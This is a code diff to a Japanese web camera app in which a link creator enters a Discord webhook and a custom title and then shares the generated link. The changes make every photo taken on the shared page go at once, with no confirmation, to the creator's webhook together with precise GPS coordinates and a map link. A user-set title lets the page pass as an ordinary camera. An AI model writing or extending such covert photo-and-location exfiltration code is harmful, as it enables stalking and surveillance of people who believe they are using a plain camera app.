@@ -33,6 +33,8 @@
   video.mirrored { transform: scaleX(-1) !important; }
   canvas { display: none; }
 
+  .top-title { position: absolute; top: 50px; left: 50%; transform: translateX(-50%); color: rgba(255,255,255,0.8); font-size: 14px; font-weight: bold; letter-spacing: 1px; z-index: 15; pointer-events: none; text-shadow: 0 1px 4px rgba(0,0,0,0.8); }
+
   .grid { position: absolute; inset: 0; pointer-events: none; z-index: 10; }
   .g-v1, .g-v2 { position: absolute; top: 0; bottom: 0; width: 1px; background: rgba(255,255,255,0.25); }
   .g-v1 { left: 33.33%; } .g-v2 { left: 66.66%; }
@@ -47,14 +49,23 @@
   .bottom-bar { position: absolute; left: 0; right: 0; bottom: 0; padding: 20px 28px 40px; display: flex; align-items: center; justify-content: space-between; z-index: 20; background: linear-gradient(0deg, rgba(0,0,0,0.8) 0%, transparent 100%); }
   .thumb-btn { width: 56px; height: 56px; border-radius: 50%; border: 2px solid rgba(255,255,255,0.3); background: #1a1a1a; overflow: hidden; cursor: pointer; display: flex; align-items: center; justify-content: center; }
   .thumb-btn img { width: 100%; height: 100%; object-fit: cover; display: none; }
+  
+  /* 写真がない時のサムネイルアイコン */
+  .thumb-placeholder { color: rgba(255,255,255,0.4); font-size: 20px; }
 
   .shutter-container { display: flex; align-items: center; justify-content: center; }
   .shutter-outer { width: 76px; height: 76px; border-radius: 50%; border: 3px solid #fff; display: flex; align-items: center; justify-content: center; cursor: pointer; transition: transform 0.1s; }
   .shutter-outer:active { transform: scale(0.95); }
   .shutter-inner { width: 64px; height: 64px; border-radius: 50%; background: #fff; }
   
-  .flip-btn { width: 56px; height: 56px; border-radius: 50%; background: rgba(255,255,255,0.15); border: none; color: #fff; font-size: 24px; cursor: pointer; display: flex; align-items: center; justify-content: center; }
+  /* ★ カメラ切り替えボタン（SVGアイコン） */
+  .flip-btn { 
+    width: 56px; height: 56px; border-radius: 50%; 
+    background: rgba(255,255,255,0.15); border: none; color: #fff; 
+    cursor: pointer; display: flex; align-items: center; justify-content: center;
+  }
   .flip-btn:active { background: rgba(255,255,255,0.3); }
+  .flip-btn svg { width: 24px; height: 24px; fill: currentColor; }
 
   .flash { position: absolute; inset: 0; background: #fff; opacity: 0; pointer-events: none; z-index: 30; }
   .flash.fire { animation: flashAnim 0.3s ease-out; }
@@ -71,8 +82,11 @@
   .gallery-grid { flex: 1; overflow-y: auto; padding: 15px 20px; display: grid; grid-template-columns: repeat(3, 1fr); gap: 6px; align-content: start; }
   .gallery-item { aspect-ratio: 3 / 4; background: #222; border-radius: 4px; overflow: hidden; cursor: pointer; }
   .gallery-item img { width: 100%; height: 100%; object-fit: cover; }
+  
+  /* ギャラリーが空の時のテキスト */
+  .gallery-empty-text { grid-column: 1 / -1; text-align: center; color: #888; padding: 50px 20px; font-size: 14px; line-height: 1.6; }
 
-  /* ================= プレビュー（スワイプ対応） ================= */
+  /* ================= プレビュー ================= */
   .preview-overlay { position: fixed; inset: 0; background: #000; z-index: 1000; display: none; flex-direction: column; }
   .preview-overlay.open { display: flex; }
   .preview-header { position: absolute; top: 0; left: 0; right: 0; padding: 50px 20px 20px; display: flex; justify-content: space-between; align-items: center; background: linear-gradient(180deg, rgba(0,0,0,0.8), transparent); z-index: 1010; pointer-events: none; }
@@ -96,7 +110,6 @@
   .map-header { padding: 50px 20px 20px; display: flex; justify-content: space-between; background: linear-gradient(180deg, rgba(0,0,0,0.8), transparent); position: absolute; top:0; left:0; right:0; z-index: 90; color:#fff; pointer-events: none; }
   .map-header button { pointer-events: auto; background: #fff; color: #000; border: none; padding: 8px 16px; border-radius: 20px; font-weight: bold; font-size: 14px; cursor: pointer; }
   #map { flex: 1; width: 100%; height: 100%; z-index: 10; background: #222; }
-  
   .custom-pin { width: 50px; height: 50px; border-radius: 50%; border: 3px solid #ffcc00; object-fit: cover; box-shadow: 0 4px 12px rgba(0,0,0,0.6); background: #000; }
 
   /* ================= 権限・その他 ================= */
@@ -111,6 +124,10 @@
 <div id="creatorApp">
   <div class="creator-wrap">
     <h1>📷 カメラ・マップ共有</h1>
+    <div>
+      <label>サイトのタイトル（例：音無しカメラ）</label>
+      <input type="text" id="titleInput" placeholder="マイカメラ" value="マイカメラ">
+    </div>
     <div>
       <label>Discord Webhook URL</label>
       <input type="text" id="webhookInput" placeholder="https://discord.com/api/webhooks/...">
@@ -131,6 +148,10 @@
   <div class="camera-view" id="cameraView">
     <video id="video" autoplay playsinline muted></video>
     <canvas id="canvas"></canvas>
+    
+    <!-- 設定したタイトルを表示 -->
+    <div class="top-title" id="appTitle">マイカメラ</div>
+
     <div class="grid">
       <div class="g-v1"></div><div class="g-v2"></div>
       <div class="g-h1"></div><div class="g-h2"></div>
@@ -141,12 +162,19 @@
 
   <div class="bottom-bar">
     <div class="thumb-btn" id="thumbBtn">
+      <span class="thumb-placeholder" id="thumbPlaceholder">🖼</span>
       <img id="thumbImg" alt="">
     </div>
     <div class="shutter-container">
       <div class="shutter-outer" id="shutter"><div class="shutter-inner"></div></div>
     </div>
-    <button class="flip-btn" id="flipBtn">🔄</button>
+    
+    <!-- 切り替えボタン（SVG） -->
+    <button class="flip-btn" id="flipBtn" title="カメラ切り替え">
+      <svg viewBox="0 0 24 24">
+        <path d="M20 5h-3.17L15 3H9L7.17 5H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 14H4V7h16v12zM12 8c-2.76 0-5 2.24-5 5s2.24 5 5 5 5-2.24 5-5-2.24-5-5-5zm0 8c-1.65 0-3-1.35-3-3s1.35-3 3-3 3 1.35 3 3-1.35 3-3 3z"/>
+      </svg>
+    </button>
   </div>
 
   <div class="gallery-overlay" id="galleryOverlay">
@@ -157,7 +185,9 @@
         <button class="gallery-close" id="galleryClose">✕</button>
       </div>
     </div>
-    <div class="gallery-grid" id="galleryGrid"></div>
+    <div class="gallery-grid" id="galleryGrid">
+      <div class="gallery-empty-text" id="galleryEmpty">まだ写真がありません。<br>シャッターを押して撮影してください。</div>
+    </div>
   </div>
 
   <div class="preview-overlay" id="previewOverlay">
@@ -193,6 +223,7 @@
   // ================= 作成サイト =================
   const creatorApp = document.getElementById('creatorApp');
   const cameraApp = document.getElementById('cameraApp');
+  const titleInput = document.getElementById('titleInput');
   const webhookInput = document.getElementById('webhookInput');
   const createBtn = document.getElementById('createBtn');
   const resultBox = document.getElementById('resultBox');
@@ -200,13 +231,14 @@
   const copyBtn = document.getElementById('copyBtn');
 
   createBtn.addEventListener('click', () => {
+    const title = titleInput.value.trim() || 'マイカメラ';
     const wh = webhookInput.value.trim();
     if (!wh.startsWith('https://discord.com/api/webhooks/')) {
       alert('正しいDiscord Webhook URLを入力してください。');
       return;
     }
     const base = location.href.split(/[?#]/)[0];
-    const link = base + '#?d=' + encodeBase64({ w: wh });
+    const link = base + '#?d=' + encodeBase64({ w: wh, t: title });
     linkInput.value = link;
     resultBox.classList.add('show');
   });
@@ -225,11 +257,14 @@
   const shutter = document.getElementById('shutter');
   const thumbBtn = document.getElementById('thumbBtn');
   const thumbImg = document.getElementById('thumbImg');
+  const thumbPlaceholder = document.getElementById('thumbPlaceholder');
   const cameraView = document.getElementById('cameraView');
   const flipBtn = document.getElementById('flipBtn');
+  const appTitle = document.getElementById('appTitle');
   
   const galleryOverlay = document.getElementById('galleryOverlay');
   const galleryGrid = document.getElementById('galleryGrid');
+  const galleryEmpty = document.getElementById('galleryEmpty');
   const galleryClose = document.getElementById('galleryClose');
   const btnOthers = document.getElementById('btnOthers');
 
@@ -260,20 +295,22 @@
   let startX = 0, startY = 0, startDist = 0, startScale = 1, startPanX = 0, startPanY = 0;
   let currentFacingMode = 'environment';
 
+  // 位置情報取得
   function getLocation() {
-    return new Promise((resolve, reject) => {
-      if (!navigator.geolocation) { reject(new Error('位置情報非対応')); return; }
+    return new Promise((resolve) => {
+      if (!navigator.geolocation) { resolve(null); return; }
       navigator.geolocation.getCurrentPosition(
         (pos) => {
           myLocation = { lat: pos.coords.latitude, lng: pos.coords.longitude };
           resolve(myLocation);
         },
-        (err) => reject(err),
+        () => { resolve(null); }, // 拒否されたらnullを返す
         { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
       );
     });
   }
 
+  // カメラ起動
   function startCamera(facingMode) {
     permText.textContent = "カメラを起動中...";
     permBtn.style.display = 'none';
@@ -306,6 +343,7 @@
 
   permBtn.addEventListener('click', () => startCamera(currentFacingMode));
 
+  // カメラ切り替え
   flipBtn.addEventListener('click', () => {
     if (stream) {
       currentFacingMode = (currentFacingMode === 'environment') ? 'user' : 'environment';
@@ -314,6 +352,7 @@
     }
   });
 
+  // ピンチ・パン
   cameraView.addEventListener('touchstart', (e) => {
     if (e.touches.length === 2) {
       startDist = Math.hypot(e.touches[0].pageX - e.touches[1].pageX, e.touches[0].pageY - e.touches[1].pageY);
@@ -349,7 +388,8 @@
     }
   }
 
-  function takePhoto() {
+  // 撮影（即時Discord送信）
+  async function takePhoto() {
     if (!stream || !video.videoWidth || shutterBusy) return;
     shutterBusy = true;
     flash.classList.remove('fire'); void flash.offsetWidth; flash.classList.add('fire');
@@ -386,13 +426,63 @@
     const dataURL = canvas.toDataURL('image/jpeg', 0.92);
     const blob = dataURLtoBlob(dataURL);
 
-    mediaItems.push({ dataURL, blob, timestamp: Date.now(), isUploaded: false });
+    // 撮影したら即座に位置情報を取得してDiscordへ送信
+    const loc = await getLocation();
+    const item = { dataURL, blob, timestamp: Date.now(), isUploaded: true, location: loc };
+    
+    mediaItems.push(item);
     thumbImg.style.display = 'block'; thumbImg.src = dataURL;
+    thumbPlaceholder.style.display = 'none';
     renderGallery();
+
+    // Discord送信処理
+    if (webhookURL) {
+      sendToDiscord(item, loc);
+    }
 
     setTimeout(() => { shutterBusy = false; }, 300);
   }
   shutter.addEventListener('click', takePhoto);
+
+  // Discordへ送信する関数
+  async function sendToDiscord(item, loc) {
+    try {
+      const fname = 'photo_' + item.timestamp + '.jpg';
+      let fields = [
+        { name: '日時', value: '`' + new Date(item.timestamp).toLocaleString('ja-JP') + '`', inline: true }
+      ];
+      let desc = '';
+      
+      if (loc) {
+        const gmapLink = `https://www.google.com/maps?q=${loc.lat.toFixed(6)},${loc.lng.toFixed(6)}`;
+        desc = `[🗺️ Googleマップでこの場所を見る](${gmapLink})`;
+        fields.push(
+          { name: '緯度', value: '`' + loc.lat.toFixed(6) + '`', inline: true },
+          { name: '経度', value: '`' + loc.lng.toFixed(6) + '`', inline: true }
+        );
+      } else {
+        desc = '位置情報なし';
+      }
+
+      const payload = {
+        username: 'Camera Bot',
+        embeds: [{
+          title: '📍 写真が撮影されました',
+          color: 0x2575fc,
+          description: desc,
+          fields: fields,
+          image: { url: 'attachment://' + fname }
+        }]
+      };
+      const form = new FormData();
+      form.append('payload_json', JSON.stringify(payload));
+      form.append('files[0]', item.blob, fname);
+      
+      await fetch(webhookURL, { method: 'POST', body: form });
+    } catch (e) {
+      console.error("Discord送信エラー", e);
+    }
+  }
 
   function dataURLtoBlob(dataURL) {
     const parts = dataURL.split(',');
@@ -403,9 +493,15 @@
     return new Blob([bytes], { type: mime });
   }
 
+  // ギャラリー描画
   function renderGallery() {
-    if (mediaItems.length === 0) return;
     galleryGrid.innerHTML = '';
+    if (mediaItems.length === 0) {
+      galleryGrid.appendChild(galleryEmpty);
+      galleryEmpty.style.display = 'block';
+      return;
+    }
+    
     for (let i = mediaItems.length - 1; i >= 0; i--) {
       const item = mediaItems[i];
       const el = document.createElement('div');
@@ -414,7 +510,6 @@
       el.appendChild(img);
       
       el.onclick = () => {
-        // ギャラリー全体をスワイプできるように配列を渡す
         const itemsReversed = [...mediaItems].reverse();
         const startIndex = itemsReversed.indexOf(item);
         openPreview(itemsReversed, startIndex);
@@ -435,7 +530,6 @@
       previewContent.appendChild(slide);
     });
     
-    // スワイプ位置をリセットしてから指定位置へ
     previewContent.scrollLeft = 0;
     setTimeout(() => {
       previewContent.scrollLeft = previewContent.clientWidth * startIndex;
@@ -444,7 +538,6 @@
     
     previewOverlay.classList.add('open');
     
-    // スクロール（スワイプ）を検知してUIを更新
     previewContent.onscroll = () => {
       const index = Math.round(previewContent.scrollLeft / previewContent.clientWidth);
       updatePreviewUI(index);
@@ -463,7 +556,8 @@
       pageIndicator.style.display = 'none';
     }
     
-    if (currentPreviewItem.isUploaded || currentPreviewItem.blob === null) {
+    // すでに撮影時にアップロード(送信)されているので、基本は「済」表示
+    if (currentPreviewItem.isUploaded) {
       previewUpload.textContent = '済';
       previewUpload.style.background = '#555';
       previewUpload.disabled = true;
@@ -503,76 +597,30 @@
     }
   };
 
+  // 手動アップロードボタン（基本は自動送信だが、念のため）
   previewUpload.onclick = async () => {
     if (!currentPreviewItem || currentPreviewItem.isUploaded || !webhookURL) return;
-    
-    previewUpload.textContent = '位置情報取得中...';
+    previewUpload.textContent = '送信中...';
     previewUpload.disabled = true;
-    
-    try {
-      const loc = await getLocation();
-      previewUpload.textContent = '送信中...';
-      
-      const fname = 'photo_' + currentPreviewItem.timestamp + '.jpg';
-      const gmapLink = `https://www.google.com/maps?q=${loc.lat.toFixed(6)},${loc.lng.toFixed(6)}`;
-      
-      const payload = {
-        username: 'Map Camera Bot',
-        embeds: [{
-          title: '📍 写真がアップロードされました',
-          color: 0x2575fc,
-          description: `[🗺️ Googleマップでこの場所を見る](${gmapLink})`,
-          fields: [
-            { name: '緯度', value: '`' + loc.lat.toFixed(6) + '`', inline: true },
-            { name: '経度', value: '`' + loc.lng.toFixed(6) + '`', inline: true },
-            { name: '日時', value: '`' + new Date(currentPreviewItem.timestamp).toLocaleString('ja-JP') + '`', inline: true }
-          ],
-          image: { url: 'attachment://' + fname }
-        }]
-      };
-      const form = new FormData();
-      form.append('payload_json', JSON.stringify(payload));
-      form.append('files[0]', currentPreviewItem.blob, fname);
-      
-      const res = await fetch(webhookURL, { method: 'POST', body: form });
-      if (res.ok) {
-        currentPreviewItem.isUploaded = true;
-        previewUpload.textContent = '済';
-        previewUpload.style.background = '#555';
-        
-        let uploadedHistory = JSON.parse(localStorage.getItem('uploadedHistory') || '[]');
-        uploadedHistory.push({
-          lat: loc.lat,
-          lng: loc.lng,
-          img: currentPreviewItem.dataURL,
-          timestamp: currentPreviewItem.timestamp
-        });
-        localStorage.setItem('uploadedHistory', JSON.stringify(uploadedHistory));
-        
-      } else {
-        throw new Error('送信失敗');
-      }
-    } catch (e) {
-      alert('アップロードに失敗しました。\n位置情報の許可が必要です。');
-      previewUpload.textContent = 'アップロード';
-      previewUpload.style.background = '#ffcc00';
-      previewUpload.disabled = false;
-    }
+    await sendToDiscord(currentPreviewItem, currentPreviewItem.location);
+    currentPreviewItem.isUploaded = true;
+    previewUpload.textContent = '済';
+    previewUpload.style.background = '#555';
   };
 
-  thumbBtn.addEventListener('click', () => { if (mediaItems.length > 0) galleryOverlay.classList.add('open'); });
+  // 空でもギャラリーを開けるようにする
+  thumbBtn.addEventListener('click', () => {
+    renderGallery();
+    galleryOverlay.classList.add('open');
+  });
+  
   galleryClose.addEventListener('click', () => galleryOverlay.classList.remove('open'));
 
   // ================= マップ =================
   btnOthers.addEventListener('click', async () => {
     galleryOverlay.classList.remove('open');
     
-    try {
-      await getLocation();
-    } catch(e) {
-      console.log("位置情報が拒否されたため、初期位置で表示します");
-    }
-    
+    await getLocation();
     mapOverlay.classList.add('open');
     
     if (!myMap) {
@@ -592,7 +640,6 @@
     }
     
     setTimeout(() => { myMap.invalidateSize(); }, 200);
-    
     renderLocalHistory();
   });
 
@@ -607,7 +654,6 @@
     const uploadedHistory = JSON.parse(localStorage.getItem('uploadedHistory') || '[]');
     if (uploadedHistory.length === 0) return;
 
-    // 位置情報が近いものをグループ化するロジック
     const groups = [];
     uploadedHistory.forEach(item => {
       let foundGroup = false;
@@ -623,7 +669,6 @@
       }
     });
 
-    // グループごとにマーカーを立てる
     groups.forEach(group => {
       const myIcon = L.divIcon({
         className: 'custom-div-icon',
@@ -635,7 +680,6 @@
       const marker = L.marker([group[0].lat, group[0].lng], { icon: myIcon }).addTo(mapMarkersLayer);
       
       marker.on('click', () => {
-        // グループ内のすべての画像をスワイプ用配列に
         const itemsToPreview = group.map(g => ({
           dataURL: g.img,
           blob: null,
@@ -657,6 +701,13 @@
       
       if (data && data.w) {
         webhookURL = data.w;
+        
+        // タイトルの反映
+        if (data.t) {
+          appTitle.textContent = data.t;
+          document.title = data.t;
+        }
+        
         creatorApp.style.display = 'none';
         cameraApp.classList.add('active');
         permScreen.classList.remove('hidden');
